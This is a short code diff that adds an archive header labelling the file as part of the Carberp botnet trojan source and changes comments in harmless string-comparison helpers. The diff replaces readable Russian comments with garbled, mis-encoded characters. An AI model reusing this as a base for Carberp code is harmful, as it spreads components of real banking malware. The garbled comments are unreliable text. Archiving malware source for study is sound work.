@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "util.h"
 #include <Psapi.h>
 
@@ -21,7 +32,7 @@ const char* u_strstr(const char* s, const char* sub)
 	return 0;
 }
 
-//сравнение символов без учета регистра
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 int u_icmpchar(char c1, char c2)
 {
 	if( c1 >= 'a' && c1 <= 'z' )
@@ -31,7 +42,7 @@ int u_icmpchar(char c1, char c2)
 	return c1 - c2;
 }
 
-//поиск подстроки в строке без учета регистра и только для английских букв
+//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 const char* u_istrstr(const char* s, const char* sub)
 {
 	int c_s = lstrlen(s);
